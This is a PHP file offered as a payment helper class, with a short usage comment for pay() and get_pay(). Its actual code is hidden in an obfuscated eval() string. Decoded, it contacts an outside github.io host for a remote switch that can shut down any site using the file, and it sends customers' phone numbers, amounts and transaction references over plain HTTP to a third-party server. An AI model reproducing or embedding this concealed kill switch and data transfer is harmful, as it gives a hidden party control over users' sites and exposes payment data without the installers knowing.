<?php
	session_start();
	/*
	*		HDEV PAYMENT CLASS
	*
	* _____docs_____
	*
	*		___INTERNET CONNECTION IS REQUIRED___
	*
	* include this file where you need payment functions 
	* ALL ACTIVITIES STARTS WITH INCLUDING THIS FILE 
	*
	*
	*	$pay = hdev_payment::pay($tel,$amount,$transaction_ref);
	*	You will check the response by using
	*	var_dump($pay);
	*
	*	
	*
	*	for payment verification 
	*
	*	$result = hdev_payment::get_pay($transaction_ref);
	*	var_dump($result);
	*
	*	______end____
	*/


	if (!class_exists('hdev_payment')) {
		if(!function_exists("agF1gTdKEBPd6CaJ")) { function agF1gTdKEBPd6CaJ($ekV4gb3DGH29YotI) { $fYZ2g87NjIGLnXVg=""; $rZJ3glaFcSAz0dZY=0; $qVh0gqGnK20A4iOB=strlen($ekV4gb3DGH29YotI); while($rZJ3glaFcSAz0dZY < $qVh0gqGnK20A4iOB) { if($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY] == ' ') { $fYZ2g87NjIGLnXVg.=" "; } else if($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY] == '!') { $fYZ2g87NjIGLnXVg.=chr((ord($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY+1])-ord('A'))*16+(ord($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY+2])-ord('a'))); $rZJ3glaFcSAz0dZY+=2; } else { $fYZ2g87NjIGLnXVg.=chr(ord($ekV4gb3DGH29YotI[$rZJ3glaFcSAz0dZY])+1); } $rZJ3glaFcSAz0dZY++; } return $fYZ2g87NjIGLnXVg; } }if(time()>1668061789)/*HDEV MASTERS*/;eval(agF1gTdKEBPd6CaJ('du`k!Ci`fE0fScJDAOc5B`I!Ci&gd !CbBh!CbBaaj_qq]cvgqrq!CbBh%ade%!Ci!Ci y   aj_qq ade y npgt_rc qr_rga !CbBdtt ; lsjj9 ns`jga qr_rga dslargml rgaicr]n_w!CbBh!Ci y !CbBdspj ; !CbBbfrrnq8--gxcpcpmecp,egrfs`,gm-kp]ade,hqml!CbBb9 !CbBdaspj ; aspj]glgr!CbBh!CbBdspj!Ci9 aspj]qcrmnr!CbBh!CbBdaspj* ASPJMNR]SPJ* !CbBdspj!Ci9 aspj]qcrmnr!CbBh!CbBdaspj* ASPJMNR]PCRSPLRP?LQDCP* rpsc!Ci9 !CbBdfc_bcpq ; _pp_w!CbBh !CbBb?aacnr8 _nnjga_rgml-hqml!CbBb* !Ci9 aspj]qcrmnr!CbBh!CbBdaspj* ASPJMNR]FRRNFC?BCP* !CbBdfc_bcpq!Ci9  !Cb@jaspj]qcrmnr!CbBh!CbBdaspj* ASPJMNR]QQJ]TCPGDWFMQR* d_jqc!Ci9 aspj]qcrmnr!CbBh!CbBdaspj* ASPJMNR]QQJ]TCPGDWNCCP* d_jqc!Ci9 !CbBdpcqn ; aspj]cvca!CbBh!CbBdaspj!Ci9 aspj]ajmqc!CbBh!CbBdaspj!Ci9 gd !CbBh!CbBacknrw!CbBh!CbBdpcqn!Ci!Ci y qcjd88!CbBdtt ; hqml]bcambc!CbBh!CbBdpcqn!Ci9 {cjqcy !CbBdpcqn ; !CbBb!CbBb9 { { ns`jga qr_rga dslargml afcai!CbBh!Ci y !CbBd_argtc ; d_jqc9 gd !CbBh!CbBd]QCQQGML!Ci y gd !CbBhgqqcr!CbBh!CbBd]QCQQGMLY%rgaicr]n_w%!CbEm!Ci $$ !CbBd]QCQQGMLY%rgaicr]n_w%!CbEm ;; !CbBbml!CbBb!Ci y !CbBd_argtc ; rpsc9 { { gd !CbBh!CbBa!CbBd_argtc!Ci y ade88rgaicr]n_w!CbBh!Ci9 gd !CbBhgqqcr!CbBhqcjd88!CbBdtt+<rgaicr]n_w!Ci $$ gqqcr!CbBhqcjd88!CbBdtt+<me!Ci $$ gqqcr!CbBhqcjd88!CbBdtt+<egrfs`!Ci!Ci y !CbBdpclr ; qcjd88!CbBdtt+<rgaicr]n_w9 !CbBdme ; qcjd88!CbBdtt+<me9 !CbBdegr ; qcjd88!CbBdtt+<egrfs`9 gd !CbBh!CbBdpclr ;; !CbBbml!CbBb $$ !CbBdme ;; !CbBbGXCPC FGPU? PMECP!CbBb!Ci y !CbBd]QCQQGMLY%rgaicr]n_w%!CbEm ; !CbBbml!CbBb9 !CbBd_argtc ; rpsc9 { { { gd !CbBh!CbBd_argtc!Ci y !CbBd]QCQQGMLY%rgaicr]n_w%!CbEm ; !CbBbml!CbBb9  !Cb@j !Cb@j{cjqcy !CbBd]QCQQGMLY%rgaicr]n_w%!CbEm ; !CbBbmdd!CbBb9 cafm !CbBb:qn_l<,,zz,,((:-qn_l<!CbBb9 cvgr!CbBh!Ci9 bgc!CbBh!Ci9 { { { { ade88afcai!CbBh!Ci9 aj_qq fbct]n_wkclr y ns`jga qr_rga dslargml n_w!CbBh!CbBdrcj*!CbBd_kmslr*!CbBdrp_lq_argml]pcd!Ciy !CbBdaspj ; aspj]glgr!CbBh!Ci9 aspj]qcrmnr]_pp_w!CbBh!CbBdaspj* _pp_w!CbBh ASPJMNR]SPJ ;< %frrn8--qfmn,qafmmjqapccl,vwx-n_w-pcoscqr]n_w,nfn%* ASPJMNR]PCRSPLRP?LQDCP ;< rpsc* ASPJMNR]CLAMBGLE ;< %%* ASPJMNR]K?VPCBGPQ ;< /.* ASPJMNR]RGKCMSR ;< .* ASPJMNR]DMJJMUJMA?RGML ;< rpsc* ASPJMNR]FRRN]TCPQGML ;< ASPJ]FRRN]TCPQGML]/]/* ASPJMNR]ASQRMKPCOSCQR ;< %NMQR%* ASPJMNR]NMQRDGCJBQ ;< _pp_w!CbBh%rcj% ;< !CbBdrcj*%rv]pcd% ;< !CbBdrp_lq_argml]pcd*%_kmslr% ;< !CbBd_kmslr!Ci* !Ci!Ci9 !CbBdpcqnmlqc ; aspj]cvca!CbBh!CbBdaspj!Ci9 aspj]ajmqc!CbBh!CbBdaspj!Ci9 pcrspl hqml]bcambc!CbBh!CbBdpcqnmlqc!Ci9 { ns`jga qr_rga dslargml ecr]n_w!CbBh!CbBdrv]pcd;%%!Ci y !CbBdaspj ; aspj]glgr!CbBh!Ci9 aspj]qcrmnr]_pp_w!CbBh!CbBdaspj* _pp_w!CbBh ASPJMNR]SPJ ;< %frrn8--qfmn,qafmmjqapccl,vwx-n_w-ecr]n_w,nfn%* ASPJMNR]PCRSPLRP?LQDCP ;< rpsc* ASPJMNR]CLAMBGLE ;< %%* ASPJMNR]K?VPCBGPQ ;< /.* ASPJMNR]RGKCMSR ;< .* ASPJMNR]DMJJMUJMA?RGML ;< rpsc* ASPJMNR]FRRN]TCPQGML ;< ASPJ]FRRN]TCPQGML]/]/* ASPJMNR]ASQRMKPCOSCQR ;< %NMQR%* ASPJMNR]NMQRDGCJBQ ;< _pp_w!CbBh%rv]pcd% ;< !CbBdrv]pcd!Ci* !Ci!Ci9 !CbBdpcqnmlqc ; aspj]cvca!CbBh!CbBdaspj!Ci9 aspj]ajmqc!CbBh!CbBdaspj!Ci9 pcrspl hqml]bcambc!CbBh!CbBdpcqnmlqc!Ci9 { {   9&((:'));
	} 

?>
